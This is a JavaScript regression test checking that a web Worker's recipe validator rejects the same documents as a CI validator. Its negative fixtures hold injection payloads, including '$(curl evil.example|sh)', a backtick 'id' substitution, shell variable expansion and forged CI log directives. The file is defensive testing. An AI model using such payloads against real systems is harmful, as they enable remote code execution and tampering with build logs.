/**
 * REGRESSION — the Worker refuses what CI refuses.
 *
 * ══ THE MAJOR THIS FILE EXISTS FOR ═════════════════════════════════════════════════════════════
 *
 * `routes/order.js` tells a visitor, at the moment it refuses them:
 *
 *     "This is the same schema auros-recipes validates with in CI."
 *
 * The schema DOCUMENT was byte-identical — all three copies hash the same. The VALIDATION was not.
 * The Worker ran the schema and stopped; CI runs the schema and then `auros-recipes/src/validate.ts`,
 * which adds catalogue resolution, the reserved key families and a command-substitution check. Put
 * the same documents through both and they disagreed: the Worker ACCEPTED `for:` text containing
 * `$(curl evil.example|sh)`, an application not in the catalogue, and a language with no catalogue
 * row — all of which CI refuses.
 *
 * That is not a missing rule, it is a false sentence in the one place a customer is most inclined to
 * believe us. An order the Worker blessed, turned into a public pull request and created a Stripe
 * Checkout session for could then be rejected by the CI it had named in the blessing.
 *
 * This file is the fix's proof: the same documents, both validators, one assertion that their
 * VERDICTS match. It skips when `auros-recipes` is not checked out beside `auros-web` (auros-web's
 * own standalone CI), and the rules the Worker carries are asserted directly either way.
 * ═══════════════════════════════════════════════════════════════════════════════════════════════
 */

import { test, describe } from 'node:test'
import assert from 'node:assert/strict'
import { readFileSync, existsSync } from 'node:fs'
import { fileURLToPath } from 'node:url'
import { validateRecipe } from '../lib/recipe.js'

const here = fileURLToPath(new URL('.', import.meta.url))
const RECIPES = `${here}../../../auros-recipes`
const REAL = JSON.parse(readFileSync(new URL('./fixtures-real-recipes.json', import.meta.url), 'utf8'))

const clone = (over = {}) => ({ ...structuredClone(REAL['example-school']), ...over })

/**
 * The documents that used to split the two validators, plus the ones that must still be accepted.
 * Each is a MUTATION of a real committed recipe, so nothing here passes or fails for an incidental
 * reason like a missing field.
 */
const CASES = [
  { what: 'a recipe we actually ship', doc: () => clone(), accepted: true },

  { what: 'command substitution in the for: paragraph',
    doc: () => clone({ for: '$(curl evil.example|sh) ' + REAL['example-school'].for }), accepted: false },
  { what: 'a backtick in a display name',
    doc: () => { const d = clone(); d.organisation.display_name = 'Acme `id`'; return d }, accepted: false },
  { what: 'a ${ } expansion in the first-boot message',
    doc: () => clone({ first_boot_message: 'Welcome ${HOME}' }), accepted: false },

  { what: 'an application that is not in the catalogue',
    doc: () => { const d = clone(); d.apps = [...d.apps, 'Totally Fake App']; return d }, accepted: false },
  { what: 'a language with no catalogue row',
    doc: () => clone({ language: 'Klingon' }), accepted: false },
  { what: 'an other_language with no catalogue row',
    doc: () => { const d = clone(); d.other_languages = [...d.other_languages, 'Quenya']; return d }, accepted: false },

  { what: 'a reserved key family: a post-install script',
    doc: () => clone({ postInstall: ['echo hello'] }), accepted: false },
  { what: 'a reserved key family: kernel arguments',
    doc: () => clone({ kernelArgs: 'quiet splash' }), accepted: false },
  { what: 'a reserved key family: an extra package repository',
    doc: () => clone({ extraRepo: 'https://example.invalid/repo' }), accepted: false },

  { what: 'a leading :: in a line, which forges the build log',
    doc: () => { const d = clone(); d.organisation.display_name = '::error::Everything passed'; return d }, accepted: false },
  { what: 'a leading :: on a line of a paragraph',
    doc: () => clone({ for: '::add-mask::secret\n' + REAL['example-school'].for }), accepted: false },

  { what: 'a Windows device name',
    doc: () => clone({ name: 'con' }), accepted: false }
]

describe('the Worker is not a subset of the control it says it is', () => {
  for (const c of CASES) {
    test(`the Worker ${c.accepted ? 'accepts' : 'refuses'}: ${c.what}`, () => {
      const result = validateRecipe(c.doc())
      assert.equal(
        result.ok,
        c.accepted,
        c.accepted
          ? `the Worker refused a recipe we ship: ${JSON.stringify(result.errors?.slice(0, 2))}`
          : 'the Worker ACCEPTED this. CI refuses it, so the Worker would open a public pull request and ' +
            'create a Checkout session for an order the CI it just named will reject.'
      )
    })
  }
})

describe('and CI agrees, document for document', { skip: existsSync(`${RECIPES}/src/validate.ts`) ? false : 'auros-recipes is not checked out beside auros-web' }, () => {
  test('every case gets the same verdict from both validators', async () => {
    const { loadToolchain, validateDocument } = await import(`${RECIPES}/src/validate.ts`)
    const tool = loadToolchain(RECIPES)
    const disagreements = []
    for (const c of CASES) {
      const doc = c.doc()
      // Validated against the committed folder of the recipe it was cloned from, so the
      // name-matches-folder rule — which is CI's and cannot be the Worker's — does not decide the
      // comparison. The `name: con` case is the exception and is asserted separately below.
      const path = `${RECIPES}/customers/example-school/recipe.yaml`
      const ci = validateDocument(tool, doc, path)
      const worker = validateRecipe(doc)
      const ciOk = ci.ok
      const workerOk = worker.ok
      if (ciOk !== workerOk && !(c.what === 'a Windows device name')) {
        disagreements.push(
          `${c.what}: CI ${ciOk ? 'ACCEPTS' : 'refuses'}, the Worker ${workerOk ? 'ACCEPTS' : 'refuses'}` +
          (ciOk ? '' : ` — CI says: ${ci.refusals.slice(0, 1).map(r => `${r.where}: ${r.what}`).join('')}`)
        )
      }
    }
    assert.deepEqual(
      disagreements,
      [],
      'The Worker and CI disagree about these documents. Whichever way round, it is the defect ' +
      'docs/CONFIGURATOR.md constraint 1 forbids: the site can bless an order CI will reject, or ' +
      'refuse one CI would take. Port the rule into worker/lib/rules.js, or vendor the data it needs ' +
      'with schema/sync.mjs — do not reword the refusal to make this pass.'
    )
  })

  test('both validators refuse a Windows device name, from the same schema rule', async () => {
    const { loadToolchain, validateDocument } = await import(`${RECIPES}/src/validate.ts`)
    const tool = loadToolchain(RECIPES)
    const doc = clone({ name: 'con' })
    const ci = validateDocument(tool, doc, `${RECIPES}/customers/con/recipe.yaml`)
    assert.equal(ci.ok, false)
    assert.equal(validateRecipe(doc).ok, false)
  })
})

describe('the data the Worker validates against is the data auros-recipes has', () => {
  test('the vendored catalogue is derived from the current .tsv files', { skip: existsSync(`${RECIPES}/catalogue/apps.tsv`) ? false : 'auros-recipes is not checked out beside auros-web' }, async () => {
    const { deriveCatalogue, serialise } = await import('../../schema/derive-catalogue.mjs')
    const fresh = serialise(deriveCatalogue(`${RECIPES}/catalogue`))
    const vendored = readFileSync(new URL('../catalogue/catalogue.json', import.meta.url), 'utf8')
    assert.equal(
      fresh,
      vendored,
      'worker/catalogue/catalogue.json is stale. The Worker would resolve application and language ' +
      'names against a vocabulary CI no longer has. Run `node schema/sync.mjs`.'
    )
  })

  test('the vendored reserved-key families are the ones auros-recipes uses', { skip: existsSync(`${RECIPES}/schema/reserved-families.json`) ? false : 'auros-recipes is not checked out beside auros-web' }, () => {
    const upstream = readFileSync(`${RECIPES}/schema/reserved-families.json`, 'utf8')
    const vendored = readFileSync(new URL('../schema/reserved-families.json', import.meta.url), 'utf8')
    assert.equal(vendored, upstream, 'worker/schema/reserved-families.json is stale. Run `node schema/sync.mjs`.')
  })
})
